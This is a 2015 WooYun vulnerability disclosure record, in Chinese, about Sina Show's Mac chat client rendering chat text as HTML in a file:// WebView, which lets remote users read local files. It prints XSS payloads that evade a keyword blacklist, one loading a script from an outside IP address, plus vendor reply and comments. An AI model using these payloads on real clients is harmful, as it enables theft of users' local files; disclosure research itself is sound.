{"id": 73395, "wybug_id": "wooyun-2015-0148359", "wybug_title": "新浪Show视频聊天客户端(Mac版)设计缺陷可远程读取用户本地文件", "wybug_corp": "新浪", "wybug_author": "数据流", "wybug_date": "2015-10-21 15:47", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["客户端安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-27：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： Mac的客户端还是短板，很多厂商不重视，都以windows为重。。。 详细说明：  新浪show Mac版(最新)进了一个没人的聊天室 \n\n看到这样的界面与文字就知道是用webview直接测试<iframe> 居然直接在聊天界面打印出html了。\n\n本来想看看location.href的 没想到却提示非法字符\n\n“location.href” 这就是黑名单关键字\n<img src=x onerror=\"var x=location;document.write(x.href)\">\n只要拆分location和href就能绕过了\n\n 是file://域navigator.userAgent 是safari\n\n基于safari的特性，在file://下时可以跨域但测试时候发现\"/\"和域名是非法字符，但可以用ascii字符来绕过,而且也没对ip地址进行检测\n<img src=x onerror=document.body.appendChild(document.createElement('script')).src=\"http:\\x2f\\x2f23.244.125.233\\x2f1.js\">\n直接加载外部js更方便\nxhr = new XMLHttpRequest();xhr.onreadystatechange = function (){if (xhr.readyState == 4) {prompt(xhr.responseText);} };xhr.open(\"GET\",\"http://wooyun.org\");xhr.send();\n\n\n但是并不能读到safari已登陆的状态，但可以读取file://上的数据   漏洞证明：  /etc/hosts\n\n用户本机上的部分文件可被远程窃取   修复方案：     版权声明：转载请注明来源 数据流@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-10-24 10:21 厂商回复： 感谢关注新浪安全，将通知第三方进行问题修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-10-21 15:55 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1656 漏洞数:246        | WooYun is the Bigest gay place.  网络工...)\t\t \n  666    \n     2015-10-21 16:04 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:28        | 开发真是日了狗了)\t\t \n  777    \n     2015-10-21 16:23 |    \t\t泪雨无魂 \t\t\t( 普通白帽子  |\t\t\t        Rank:207 漏洞数:54        )\t\t \n  888    \n     2015-10-21 16:26 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:233 漏洞数:81        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  999    \n     2015-10-21 16:28 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1628 漏洞数:188        | 新年快乐！)\t\t \n  屌，都用起mac了    \n     2015-10-21 16:29 |    \t\t数据流  \t\t\t( 普通白帽子  |\t\t\t        Rank:738 漏洞数:93        | 没关系啊，我们还有音乐)\t\t \n  @梧桐雨  一直都在用mac。。 哈哈    \n     2015-10-21 16:55 |    \t\t撸大叔 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:11        | 钓鱼培养耐心  养鱼需要精心！)\t\t \n  666    \n     2015-10-21 22:23 |    \t\tPyNerd \t\t\t( 普通白帽子  |\t\t\t        Rank:175 漏洞数:33        | Just for shell.)\t\t \n  @_Thorns 师傅    \n     2015-10-22 17:04 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  Mark一下    \n     2015-10-24 17:00 |    \t\t坏小子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 跪求工作)\t\t \n  壕啊，都开始mac了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}